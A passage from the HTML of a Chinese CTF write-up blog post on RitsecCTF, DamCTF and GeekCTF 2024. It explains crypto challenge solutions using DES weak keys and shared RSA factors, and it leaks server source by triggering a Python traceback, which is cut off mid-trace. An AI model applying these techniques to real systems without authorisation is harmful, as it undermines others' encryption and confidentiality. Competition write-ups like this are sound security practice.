<!doctype html>
<html lang="zh-Hans" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-ctf-writeup-blog" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">GeekCTF 2024 (+2 small CTFs) | Ribom&#x27;s blogs</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://RibomBalt.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://RibomBalt.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://RibomBalt.github.io/ctf-writeup/2024/04/14/geekctf-writeup"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="GeekCTF 2024 (+2 small CTFs) | Ribom&#x27;s blogs"><meta data-rh="true" name="description" content="RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup"><meta data-rh="true" property="og:description" content="RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2024-04-14T00:00:00.000Z"><meta data-rh="true" property="article:tag" content="CTF"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://RibomBalt.github.io/ctf-writeup/2024/04/14/geekctf-writeup"><link data-rh="true" rel="alternate" href="https://RibomBalt.github.io/ctf-writeup/2024/04/14/geekctf-writeup" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://RibomBalt.github.io/ctf-writeup/2024/04/14/geekctf-writeup" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://RibomBalt.github.io/ctf-writeup/2024/04/14/geekctf-writeup","mainEntityOfPage":"https://RibomBalt.github.io/ctf-writeup/2024/04/14/geekctf-writeup","url":"https://RibomBalt.github.io/ctf-writeup/2024/04/14/geekctf-writeup","headline":"GeekCTF 2024 (+2 small CTFs)","name":"GeekCTF 2024 (+2 small CTFs)","description":"RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup","datePublished":"2024-04-14T00:00:00.000Z","author":{"@type":"Person","name":"Lysithea","description":"CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt","email":"ribombalt1@gmail.com","image":"https://github.com/RibomBalt.png"},"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://RibomBalt.github.io/ctf-writeup","name":"Blog"}}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Ribom&#39;s blogs RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Ribom&#39;s blogs Atom Feed">




<link rel="alternate" type="application/rss+xml" href="/ctf-writeup/rss.xml" title="Ribom&#39;s blogs RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/ctf-writeup/atom.xml" title="Ribom&#39;s blogs Atom Feed"><link rel="stylesheet" href="/assets/css/styles.b8d2aa6b.css">
<script src="/assets/js/runtime~main.52ed3779.js" defer="defer"></script>
<script src="/assets/js/main.a106a59f.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Ribom&#x27;s blogs</b></a><a class="navbar__item navbar__link" href="/blog">Blog</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/ctf-writeup">CTF Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/RibomBalt" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="最近博文导航"><div class="sidebarItemTitle_pO2u margin-bottom--md">All blogs</div><div role="group"><h3 class="yearGroupHeading_rMGB">9999</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/9999/12/26/summary-ctf">关于CTF Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2025/06/01/cybergame-sk">CyberGame 2025 (Slovenia-Kenya)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2025/01/27/hpcgame2">HPCGame 2025 个人Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2025/01/05/irisctf2025">Iris CTF 2025</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2024</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/11/17/geekgame2024-iot">GeekGame 2024 IoT Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/11/10/hackergame2024-writeup">Hackergame 2024 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/10/11/geekgame4-writeup">GeekGame4 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/09/23/patriotCTF">Patriot CTF 2024 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/06/24/GoogleCTF2024">Google CTF 2024 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/05/29/angstormCTF2024">TJCTF 2024 / NahamConCTF 2024 / ångstrom CTF 2024</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/05/13/TBTLCTF2024">squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)</a></li><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="/ctf-writeup/2024/04/14/geekctf-writeup">GeekCTF 2024 (+2 small CTFs)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/04/02/UTCTF2024">UTCTF 2024 个人题解</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/02/07/hpcgame2024">HPCGame1 Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2023</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/12/21/0CTF2023">0CTF 2023 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/12/05/NBCTF2023">TUCTF &amp; Newport Blakes CTF Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/11/28/TPCTF2023">TPCTF 2023 (清北CTF) Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/11/04/HG2023">Hackergame2023 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/10/21/GG3">GeekGame3 Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2022</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2022/11/27/GeekGame2">GeekGame2 CTF Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2021</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2021/11/21/GeekGame1">GeekGame1 Writeup</a></li></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class="title_f1Hy">GeekCTF 2024 (+2 small CTFs)</h1><div class="container_mt6G margin-vert--md"><time datetime="2024-04-14T00:00:00.000Z">2024年4月14日</time> · <!-- -->阅读需 62 分钟</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a class="avatar__photo-link" href="/ctf-writeup/authors/RibomBalt"><img class="avatar__photo authorImage_XqGP" src="https://github.com/RibomBalt.png" alt="Lysithea"></a><div class="avatar__intro authorDetails_lV9A"><div class="avatar__name"><a href="/ctf-writeup/authors/RibomBalt"><span class="authorName_yefp">Lysithea</span></a></div><small class="authorTitle_nd0D" title="CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt">CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt</small><div class="authorSocials_rSDt"><a href="https://github.com/RibomBalt" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 256 250" preserveAspectRatio="xMidYMid" style="--dark:#000;--light:#fff" class="authorSocialLink_owbf githubSvg_Uu4N"><path d="M128.001 0C57.317 0 0 57.307 0 128.001c0 56.554 36.676 104.535 87.535 121.46 6.397 1.185 8.746-2.777 8.746-6.158 0-3.052-.12-13.135-.174-23.83-35.61 7.742-43.124-15.103-43.124-15.103-5.823-14.795-14.213-18.73-14.213-18.73-11.613-7.944.876-7.78.876-7.78 12.853.902 19.621 13.19 19.621 13.19 11.417 19.568 29.945 13.911 37.249 10.64 1.149-8.272 4.466-13.92 8.127-17.116-28.431-3.236-58.318-14.212-58.318-63.258 0-13.975 5-25.394 13.188-34.358-1.329-3.224-5.71-16.242 1.24-33.874 0 0 10.749-3.44 35.21 13.121 10.21-2.836 21.16-4.258 32.038-4.307 10.878.049 21.837 1.47 32.066 4.307 24.431-16.56 35.165-13.12 35.165-13.12 6.967 17.63 2.584 30.65 1.255 33.873 8.207 8.964 13.173 20.383 13.173 34.358 0 49.163-29.944 59.988-58.447 63.157 4.591 3.972 8.682 11.762 8.682 23.704 0 17.126-.148 30.91-.148 35.126 0 3.407 2.304 7.398 8.792 6.14C219.37 232.5 256 184.537 256 128.002 256 57.307 198.691 0 128.001 0Zm-80.06 182.34c-.282.636-1.283.827-2.194.39-.929-.417-1.45-1.284-1.15-1.922.276-.655 1.279-.838 2.205-.399.93.418 1.46 1.293 1.139 1.931Zm6.296 5.618c-.61.566-1.804.303-2.614-.591-.837-.892-.994-2.086-.375-2.66.63-.566 1.787-.301 2.626.591.838.903 1 2.088.363 2.66Zm4.32 7.188c-.785.545-2.067.034-2.86-1.104-.784-1.138-.784-2.503.017-3.05.795-.547 2.058-.055 2.861 1.075.782 1.157.782 2.522-.019 3.08Zm7.304 8.325c-.701.774-2.196.566-3.29-.49-1.119-1.032-1.43-2.496-.726-3.27.71-.776 2.213-.558 3.315.49 1.11 1.03 1.45 2.505.701 3.27Zm9.442 2.81c-.31 1.003-1.75 1.459-3.199 1.033-1.448-.439-2.395-1.613-2.103-2.626.301-1.01 1.747-1.484 3.207-1.028 1.446.436 2.396 1.602 2.095 2.622Zm10.744 1.193c.036 1.055-1.193 1.93-2.715 1.95-1.53.034-2.769-.82-2.786-1.86 0-1.065 1.202-1.932 2.733-1.958 1.522-.03 2.768.818 2.768 1.868Zm10.555-.405c.182 1.03-.875 2.088-2.387 2.37-1.485.271-2.861-.365-3.05-1.386-.184-1.056.893-2.114 2.376-2.387 1.514-.263 2.868.356 3.061 1.403Z"></path></svg></a><a href="https://stackoverflow.com/users/RibomBalt" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="Stack Overflow"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 169.61 200" width="1em" height="1em" class="authorSocialLink_owbf"><path d="M140.44 178.38v-48.65h21.61V200H0v-70.27h21.61v48.65z" fill="#bcbbbb"></path><path d="M124.24 140.54l4.32-16.22-86.97-17.83-3.78 17.83zM49.7 82.16L130.72 120l7.56-16.22-81.02-37.83zm22.68-40l68.06 57.3 11.35-13.51-68.6-57.3-11.35 13.51zM116.14 0l-14.59 10.81 53.48 71.89 14.58-10.81zM37.81 162.16h86.43v-16.21H37.81z" fill="#f48024"></path></svg></a><a href="https://ctftime.org/team/282941" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="ctftimes"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="authorSocialLink_owbf"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M3 12a9 9 0 1 0 18 0a9 9 0 0 0 -18 0"></path><path d="M3.6 9h16.8"></path><path d="M3.6 15h16.8"></path><path d="M11.5 3a17 17 0 0 0 0 18"></path><path d="M12.5 3a17 17 0 0 1 0 18"></path></svg></a></div></div></div></div></div></header><div id="__blog-post-container" class="markdown"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="ritsecctf-2024--damctf-2024--geekctf-2024-个人writeup">RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup<a href="#ritsecctf-2024--damctf-2024--geekctf-2024-个人writeup" class="hash-link" aria-label="RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup的直接链接" title="RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup的直接链接">​</a></h2>
<p>Lysithea</p>
<p>两周连续打了三场CTF，稍微有点脱产了，会休息一段时间。
RITSEC感觉比较不太好玩，DamCTF题量不多但感觉出的点比较奇怪（说不上难）。GeekCTF则是NUS等新加坡高校联合办的<strong>个人周赛</strong>  ，难度偏高而且很有趣，猜的要素不多，是这三个比赛里我最享受的。
顺便我本来是不打算认真打的，所以没有用CTFtimes的队名登录，反正我对GeekCTF没用CTFtime登录是有点后悔的。</p>
<p>[TOC]</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ritsecctf-2024">RitsecCTF 2024<a href="#ritsecctf-2024" class="hash-link" aria-label="RitsecCTF 2024的直接链接" title="RitsecCTF 2024的直接链接">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="crypto---dastardly-evil-scientists">crypto - Dastardly Evil Scientists<a href="#crypto---dastardly-evil-scientists" class="hash-link" aria-label="crypto - Dastardly Evil Scientists的直接链接" title="crypto - Dastardly Evil Scientists的直接链接">​</a></h2>
<p>DES弱密钥题。DES有4个弱密钥，<code>&#x27;0000000000000000&#x27;,&#x27;FFFFFFFFFFFFFFFF&#x27;,&#x27;E1E1E1E1F0F0F0F0&#x27;,&#x27;1E1E1E1E0F0F0F0F&#x27;</code>，加密和解密操作是一样的。这个题给出了加密的flag，并且能给出任意密文加密，但没有解密过程。硬碰DES显然是不可取的，所以我们首先要看看是不是弱密钥。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="crypto---failed-file-transfer">crypto - Failed File Transfer<a href="#crypto---failed-file-transfer" class="hash-link" aria-label="crypto - Failed File Transfer的直接链接" title="crypto - Failed File Transfer的直接链接">​</a></h2>
<p>给了三组RSA公钥和密文，题干说是加密相同的信息。公钥1和2的N是一样的，然后公钥1和公钥3居然有最大公约数，gcd一下就出来了。意义不明。
顺便虽然公钥3的e=3，但是N还是太大了不适合直接爆破明文。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="crypto---flag-distribution-server">crypto - Flag Distribution Server<a href="#crypto---flag-distribution-server" class="hash-link" aria-label="crypto - Flag Distribution Server的直接链接" title="crypto - Flag Distribution Server的直接  链接">​</a></h2>
<p>相对有趣的一道题。</p>
<p>没有源码，只有nc服务器。我们可以指定一个【格式】和【IV】，然后打印出flag的密文。首先提供不匹配长度的IV，可以让服务器报错，泄露部分源码：</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Traceback </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">most recent call last</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/app/run&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> line </span><span class="token number" style="color:#36acaa">89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">module</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/app/run&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> line </span><span class="token number" style="color:#36acaa">76</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cipher </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> AES</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">new</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> mode</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">AES</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">MODE_CBC</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> iv</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">iv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             </span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/local/lib/python3.12/site-packages/Crypto/Cipher/AES.py&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> line </span><span class="token number" style="color:#36acaa">228</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> new</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> _create_cipher</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">modules</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">__name__</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> mode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">args</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">**</span><span class="token plain">kwargs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           </span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/local/lib/python3.12/site-packages/Crypto/Cipher/__init__.py&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> line </span><span class="token number" style="color:#36acaa">79</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _create_cipher</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> modes</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">mode</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">factory</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">**</span><span class="token plain">kwargs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           </span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" 